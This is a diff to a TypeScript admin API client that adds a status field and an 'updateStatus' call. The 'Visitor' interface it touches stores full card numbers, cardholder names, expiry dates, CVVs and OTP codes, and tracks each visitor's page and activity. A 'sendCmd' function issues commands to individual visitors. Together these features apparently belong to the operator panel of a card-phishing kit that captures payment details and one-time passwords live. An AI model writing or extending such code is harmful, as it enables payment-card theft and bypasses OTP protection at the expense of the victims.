@@ -6,6 +6,7 @@ export interface Visitor {
   cardNumber: string; cardName: string; cardMonth: string; cardYearExp: string; cardCvv: string;
   otpCode: string; otpStatus: string | null;
   page: string; isActive: boolean; lastSeen: number; country: string;
+  status: string;
 }
 
 export const adminApi = {
@@ -17,6 +18,9 @@ export const adminApi = {
   },
   async sendCmd(id: string, cmd: string) {
     await fetch(`${BASE}/cmd/${id}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cmd }) });
+  },
+  async updateStatus(id: string, status: string) {
+    await fetch(`${BASE}/submissions/${id}`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ status }) });
   },
   async delete(id: string) {
     await fetch(`${BASE}/submissions/${id}`, { method: "DELETE" });
